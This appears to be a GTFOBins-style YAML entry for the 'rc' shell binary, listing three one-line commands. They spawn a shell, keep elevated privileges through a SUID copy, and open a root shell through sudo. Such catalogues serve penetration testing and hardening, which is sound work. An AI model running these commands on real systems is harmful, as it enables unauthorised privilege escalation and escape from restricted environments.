---
functions:
  shell:
    - code: rc -c '/bin/sh'
  suid:
    - code: ./rc -c '/bin/sh -p'
  sudo:
    - code: sudo rc -c '/bin/sh'
---
